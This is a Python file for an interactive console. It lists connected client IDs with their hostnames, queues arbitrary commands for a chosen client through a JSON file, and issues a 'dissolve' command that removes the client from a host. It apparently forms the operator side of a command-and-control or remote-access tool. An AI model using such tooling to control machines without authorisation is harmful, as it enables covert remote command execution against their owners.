# console.py
import json
import settings

def newConsole():
    consoleGetID()

    print("Type help or ? for command options: ")
    while True:
        with open('./manage.json') as f:
            manage = json.load(f)

        consoleInput = input(str(manage["currID"]) + " > ")

        options = {
            "?": consoleHelp,
            "help": consoleHelp,
            "setID": consoleSetID,
            "getID": consoleGetID,
            "send": consoleSend,
            "dissolve": consoleDissolve
        }

        
        if consoleInput == '':
            continue
        if consoleInput not in options:
            print("Not an Option. Try again")
        else:
            options[consoleInput]()


def consoleHelp():
    print("\nHelp Menu\n_________\n"
            "? or help\t\tdisplay help\n"
            "setID\t\t\tset the ID to interact with\n"
            "getID\t\t\tget a list of stored IDs\n"
            "send\t\t\tsend a command to the active id\n"
            "dissolve\t\tremove client on a host\n")

def consoleSetID():
    newID = input("Which ID?: ")
    #print(newID)

    with settings.lock:
        f = open('./manage.json', 'r')
        manage = json.load(f)
        f.close()
        #print(manage["clients"])
        
        
        if newID in manage["clients"]:
            manage["currID"] = newID
            
            f = open('./manage.json', 'w')
            json.dump(manage, f)
            f.close()
        else:
            print("Not a valid ID")

# print the current client connections stored
def consoleGetID():
    print("\nID\t\tHostname")
    print("____\t\t________________")
    with open('./manage.json') as f:
        manage = json.load(f)
        for x in manage["clients"]:
            print(x + "\t\t" + manage["clients"][x]["hostname"])
    print('')

# if ID is still valid, get a command from user and set to next command for client
def consoleSend():
    command = input("Ready for command: ")

    with settings.lock:
        f = open('./manage.json', 'r')
        manage = json.load(f)
        f.close()
        
        if manage["currID"] in manage["clients"]:
            
            manage["clients"][manage["currID"]]["command"] = command
            
            f = open('./manage.json', 'w')
            json.dump(manage, f)
            f.close()
        else:
            print("Need to set a valid ID first")

def consoleDissolve():
    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        manage["clients"][manage["currID"]]["command"] = "dissolve"

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)
        
    
    print(manage["currID"] + " Dissolved!")